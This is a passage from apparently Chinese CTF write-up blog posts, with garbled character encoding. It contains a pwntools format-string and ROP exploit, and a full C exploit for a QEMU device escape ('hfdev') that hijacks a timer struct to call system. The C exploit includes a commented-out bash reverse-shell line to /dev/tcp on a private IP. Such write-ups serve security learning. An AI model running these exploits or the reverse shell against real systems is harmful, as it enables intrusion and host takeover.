class="hljs-string">b&#x27;0&#x27;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;%39$p%40$p%41$p%79$p&#x27;</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;%22$hhn&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x78&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;you.&#x27;</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elf.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1543</span><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>] - <span class="hljs-number">243</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>payload = fmtstr_payload(<span class="hljs-number">6</span>, &#123;(stack - <span class="hljs-number">0x128</span>) : (elf.address + <span class="hljs-number">0x146a</span>)&#125;,  write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;you.&#x27;</span>, payload)<br><br>pop_rdi_ret = libc.address + <span class="hljs-number">0x23b72</span><br>pop_rsi_ret = libc.address + <span class="hljs-number">0x2604f</span><br>pop_rdx__r12_ret = libc.address + <span class="hljs-number">0x119241</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>payload += flat(<br>    pop_rdi_ret, <span class="hljs-number">0</span>,<br>    pop_rsi_ret, stack,<br>    pop_rdx__r12_ret, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>,<br>    libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    pop_rdi_ret, stack,<br>    pop_rdi_ret + <span class="hljs-number">1</span>,<br>    libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>)<br><br>p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹                                    </p><h3 id="hfdev"><a href="#hfdev" class="headerlink" title="hfdev"></a>hfdev</h3><p>è¿™é“qemué€ƒé€¸æœç„¶ä¸ä¼šï¼Œå…·ä½“ç»†èŠ‚å°±çœ‹æœ¬æ–‡å¼€å¤´æ¨èçš„æ–‡ç« ï¼Œè¿™é‡Œå°±è¯´ä¸€ä¸‹è‡ªå·±é‡åˆ°çš„å‘ï¼š</p><ol><li>åˆšå¼€å§‹ç”¨inlå’Œoutlè¯»å†™æ•°æ®ï¼Œä½†å®Œå…¨æ²¡ååº”ï¼Œè¿™é¢˜è¦ç”¨inwå’Œoutwè¯»å†™ã€‚</li><li>æ‰§è¡Œhfdev_processå‡½æ•°åä¸€å®šè¦sleepï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯å¤šçº¿ç¨‹çš„åŸå› ï¼Œexpçš„ä¸»å‡½æ•°æ˜¯ä¸hfdev_processå‡½æ•°åŒæ—¶è¿è¡Œçš„ï¼Œå¦‚æœä¸sleepä¼šé€ æˆæ¡ä»¶ç«äº‰ï¼Œåé¢è®¾ç½®çš„æ•°æ®ä¼šå½±å“ä¸Šä¸€æ¬¡çš„hfdev_processå‡½æ•°çš„æ‰§è¡Œã€‚</li></ol><p>â€‹                                                               </p><p>è¿™é‡Œæ˜¯æœ¬åœ°ubuntu20å¤ç°çš„exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> port_base = <span class="hljs-number">0xc040</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> port)</span>&#123;<br>    <span class="hljs-keyword">return</span> inw(port_base + port); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> port, <span class="hljs-type">uint64_t</span> value)</span>&#123;<br>    outw(value, port_base + port); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> addr)</span>&#123;<br>    pmio_write(<span class="hljs-number">2</span>, addr);<br>    pmio_write(<span class="hljs-number">4</span>, addr &gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_size</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>&#123;<br>    pmio_write(<span class="hljs-number">6</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_time</span><span class="hljs-params">(<span class="hljs-type">size_t</span> value)</span>&#123;<br>    pmio_write(<span class="hljs-number">10</span>, value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exec_bh</span><span class="hljs-params">()</span>&#123;<br>    pmio_write(<span class="hljs-number">12</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> p_addr, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x20</span>;<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">1</span>)) = p_addr;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">9</span>)) = size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_exec_time</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> size, <span class="hljs-type">uint16_t</span> offset)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x30</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">1</span>)) = size;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = offset;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_encode1</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> add_byte, <span class="hljs-type">uint8_t</span> xor_byte, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x10</span>;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">1</span>)) = add_byte;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">2</span>)) = xor_byte;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = <span class="hljs-number">0x2202</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">5</span>)) = size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_encode2</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    *((<span class="hljs-type">uint8_t</span>*)(buf)) = <span class="hljs-number">0x10</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">3</span>)) = <span class="hljs-number">0x2022</span>;<br>    *((<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">5</span>)) = size;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> pem_buf;<br>    <span class="hljs-type">size_t</span> heap_addr;<br>    <span class="hljs-type">size_t</span> elf_base;<br>    iopl(<span class="hljs-number">3</span>);<br><br>    <span class="hljs-comment">// leak heap_addr</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-1. leak heap_addr&quot;</span>);<br>    pem_buf = gva_to_gpa(buf);<br>    write_addr(pem_buf);<br>    write_size(<span class="hljs-number">0x400</span>);<br>    set_encode1(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x100</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);   <br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br><br>    set_exec_time(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_read(pem_buf, <span class="hljs-number">0x310</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    heap_addr = *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x308</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_heap_addr_is %#lx\n&quot;</span>, heap_addr);<br>    <span class="hljs-type">size_t</span> hfdev_addr = heap_addr - <span class="hljs-number">2696</span>;<br>    <span class="hljs-type">size_t</span> time_struct = hfdev_addr + <span class="hljs-number">0x1d40</span>;<br>    <span class="hljs-type">size_t</span> bh_struct = hfdev_addr - <span class="hljs-number">0x101a80</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;time_struct_addr_is %#lx\n&quot;</span>, time_struct);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bh_struct_addr_is %#lx\n&quot;</span>, bh_struct);<br>    <br><br>    <span class="hljs-comment">//leak elf_base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-2. leak qemu elf_addr&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x10</span>, <span class="hljs-number">0x10</span>);<br>    *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x10</span>)) = time_struct;<br>    *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x18</span>)) = bh_struct;<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x300</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br><br>    write_time(<span class="hljs-number">8</span>);<br>    set_exec_time(<span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_encode2(<span class="hljs-number">0x310</span>);<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x308</span>)) = heap_addr ^ time_struct;<br>    exec_bh();<br>    sleep(<span class="hljs-number">1</span>);<br>    set_read(pem_buf, <span class="hljs-number">0x338</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    <span class="hljs-type">size_t</span> leak_addr = *((<span class="hljs-type">size_t</span>*)(buf + <span class="hljs-number">0x330</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_addr_is %#lx\n&quot;</span>, leak_addr);<br>    elf_base = leak_addr - <span class="hljs-number">0x381190</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base + <span class="hljs-number">0x2D6610</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;qemu_elf_base_is %#lx\n&quot;</span>, elf_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;STEP-3. hijack time_struct&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>);<br>    <span class="hljs-type">size_t</span> faker_time_struct_addr = heap_addr + <span class="hljs-number">0x108</span>;<br>    <span class="hljs-type">size_t</span> cmd_addr = faker_time_struct_addr + <span class="hljs-number">0x40</span>;<br>    <span class="hljs-type">size_t</span> faker_time_struct[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br>    <span class="hljs-comment">//char cmd[0x40] = &quot;/bin/bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/192.168.184.142/8888 0&gt;&amp;1\&#x27;&quot;;</span><br>    faker_time_struct[<span class="hljs-number">0</span>] = <span class="hljs-number">0xffffffffffffffff</span>;<br>    faker_time_struct[<span class="hljs-number">1</span>] = time_struct - <span class="hljs-number">0x110f360</span>;<br>    faker_time_struct[<span class="hljs-number">2</span>] = system_plt;<br>    faker_time_struct[<span class="hljs-number">3</span>] = cmd_addr;<br>    faker_time_struct[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>    faker_time_struct[<span class="hljs-number">5</span>] = <span class="hljs-number">0x100000000</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x108</span>, faker_time_struct, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x108</span> + <span class="hljs-number">0x40</span>, cmd, <span class="hljs-number">0x40</span>);<br>    *((<span class="hljs-type">uint8_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x300</span>)) = <span class="hljs-number">1</span>;<br>    *((<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x310</span>)) = faker_time_struct_addr ^ time_struct;<br>    set_encode2(<span class="hljs-number">0x318</span>);<br>    exec_bh();<br>    sleep(<span class="hljs-number">0.3</span>);<br>    set_exec_time(<span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>);<br>    exec_bh();<br><br>    <span class="hljs-comment">//0x1d40  0x101a80</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sctf2023 Brave Knights and Rusty Swords</title>
    <link href="/2023/06/27/sctf2023/"/>
    <url>/2023/06/27/sctf2023/</url>
    
    <content type="html"><![CDATA[<p>ä¸Šæ¬¡åœ¨aliyunçš„æ¯”èµ›ä¸Šä¹Ÿé‡åˆ°è¿‡rustè¯­è¨€çš„é¢˜ï¼Œä½†æ˜¯é‚£é“rustçš„é¢˜æ˜¯ä¸€é“ä¼ ç»Ÿçš„å †èœå•é¢˜ï¼Œé¢˜ç›®çš„è¾“å…¥è¾“å‡ºå®Œå…¨éƒ½ä¸ç”¨çœ‹idaå°±çŸ¥é“ï¼Œè€Œä¸”åé—¨å‡½æ•°ä¹Ÿç›´æ¥ç»™å‡ºäº†ï¼Œå¾ˆå®¹æ˜“å°±å¯ä»¥å†™å‡ºæ¥ã€‚è¿™æ¬¡sctfç»™çš„æ˜¯ä¸€ä¸ªupdæœåŠ¡ç¨‹åºï¼Œè¾“å…¥è¾“å‡ºä¹Ÿæ²¡æœ‰ç»™ä½ å¾ˆå¤šä¿¡æ¯ï¼Œè¿™ä¸‹å°±åªèƒ½å»æ‹¿idaå»ç¡¬é€†äº†ï¼ˆğŸ˜­ï¼‰ã€‚</p><p>ç”±äºæ˜¯udpæœåŠ¡ï¼Œncè¿æ¥æ—¶ä½¿ç”¨<code>nc -u 192.168.184.133 8080</code>ã€‚</p><h4 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h4><p>é¦–å…ˆçœ‹åˆ°idaä¸­çš„mainå‡½æ•°å¾ˆç®€å•ï¼Œè‚¯å®šä¸æ˜¯é€»è¾‘çš„ä¸»ä½“ï¼Œä½¿ç”¨gdb attachç¨‹åºçš„è¿›ç¨‹åå‘ç°æœ‰server_game::mainå‡½æ•°ï¼Œè¿™ä¸ªå°±æ˜¯çœŸæ­£çš„é€»è¾‘ä¸»ä½“å‡½æ•°ï¼š</p><img src="/img/14/Screenshot 2023-06-27 212845.png" style="zoom:50%;" /><p>ç‚¹è¿›å»å‘ç°æµç¨‹æå…¶å¤æ‚ï¼Œè€Œä¸”å¾ˆå¤šä»£ç å—éƒ½æ˜¯<code>jmp  short $+2</code>ç›¸è¿æ¥çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆrustè¿™æ ·ç¼–è¯‘ï¼ˆæ„Ÿè§‰æ²¡æœ‰è¿™ä¸ªjmpï¼Œç¨‹åºä¹Ÿèƒ½å¾€åç›´æ¥æ‰§è¡Œç›¸åº”çš„ä»£ç å—ï¼‰</p><img src="/img/14/Screenshot 2023-06-27 214212.png"><p>ä¼ªä»£ç å°±æ›´ä¸ç”¨è¯´äº†ï¼Œä¹Ÿä¸æ˜¯ç‰¹åˆ«å¥½çœ‹ï¼Œæœ‰å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°ï¼Œä¸è¿‡è¿™é‡Œé‡ç‚¹å…³æ³¨<code>UdpSocket::recv_from</code>ï¼Œå› ä¸ºç”¨æˆ·å°±æ˜¯é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥ä¼ é€’æ•°æ®ç»™ç¨‹åºçš„ï¼Œè€Œè¯¥udpæœåŠ¡æ˜¯ä¸æ–­æ¥æ”¶å‘½ä»¤å¾ªç¯çš„ï¼Œæ‰€ä»¥å¯ä»¥åˆæ­¥å®šä½åˆ°å¦‚ä¸‹ä¼ªä»£ç ï¼š</p><img src="/img/14/Screenshot 2023-06-28 120409.png"><p>â€‹                               </p><h4 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h4><p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°ç¨‹åºæ˜¯æ€æ ·æ¯”è¾ƒçš„å­—ç¬¦ä¸²çš„ï¼Œæˆ‘å½“æ—¶æ˜¯éšä¾¿è¾“å…¥ä¸€æ®µå­—ç¬¦ï¼Œç„¶åä½¿ç”¨gdbå®šä½åˆ°<code>UdpSocket::send_to</code>å‡½æ•°ï¼Œè¿™æ—¶æ˜¯æ‰€æœ‰çš„å­—ç¬¦éƒ½åˆ¤æ–­å¤±è´¥çš„æƒ…å†µï¼š</p><img src="/img/14/Screenshot 2023-06-27 221618.png" style="zoom: 50%;" /><p>æ¥ä¸‹æ¥ä½¿ç”¨idaä»å®šä½åˆ°<code>UdpSocket::send_to</code>å‡½æ•°è‡ªä¸‹å¾€ä¸Šæ‰¾åˆ¤æ–­åˆ†æ”¯çš„ä»£ç å—ï¼š</p><img src="/img/14/Screenshot 2023-06-27 222735.png"><p>æœ€åå‘ç°æ‰€æœ‰çš„åˆ¤æ–­åˆ†æ”¯çš„ä»£ç å—éƒ½æ˜¯å¦‚ä¸‹æ ¼å¼ï¼Œä¸­é—´çš„é‚£ä¸ªå‡½æ•°ä¼°è®¡å°±æ˜¯åˆ¤æ–­å­—ç¬¦ä¸²çš„ï¼Œè€Œå­—ç¬¦ä¸²åœ°å€å°±æ˜¯åœ¨rdxä¸­ï¼Œecxå°±æ˜¯å­—ç¬¦ä¸²é•¿åº¦ï¼š</p><img src="/img/14/Screenshot 2023-06-27 223650.png"><p>è¿›ä¸€æ­¥æŸ¥çœ‹byte_E64F1åœ°å€ä¸­çš„å†…å®¹å°±å¯ä»¥çŸ¥é“æ¯”è¾ƒçš„å­—ç¬¦ä¸²äº†</p><img src="/img/14/Screenshot 2023-06-27 224141.png" style="zoom: 50%;" /><p>â€‹                                 </p><p>æœ€åæˆ‘å‘ç°å…¶å®åªæœ‰å†å°†ä¸Šé¢å®šä½åˆ°çš„ä¼ªä»£ç 